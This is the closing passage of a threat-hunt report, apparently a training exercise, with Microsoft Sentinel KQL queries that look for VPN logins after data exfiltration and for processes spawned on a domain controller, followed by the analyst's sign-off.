| project LastExfilActivity, FirstReturn, GapDays
```

---

### VPN Sessions After Exfil - Q31 (supporting)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where AccountName has "s.brandt"
| where MdeTable contains "VPN" or ActionType has "ssl-login"
| where todatetime(EventTime) > datetime(2026-03-02T01:19:15)
| project EventTime, ActionType, RemoteIP, DeviceName
| sort by EventTime asc
```

---

### Spawning Process on DC - Q20
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceProcessEvents"
| where isnotempty(ProcessCommandLine)
| project EventTime, InitiatingProcessFileName, ProcessCommandLine, AccountName
| sort by EventTime asc
```

---

*Report authored by Adetola Kolawole | Cybersecurity Analyst*  
*Threat Hunt: Operation Silent Corridor | IR-2026-0220-01*  
*Platform: Microsoft Sentinel | LAW-SilentCorridor*
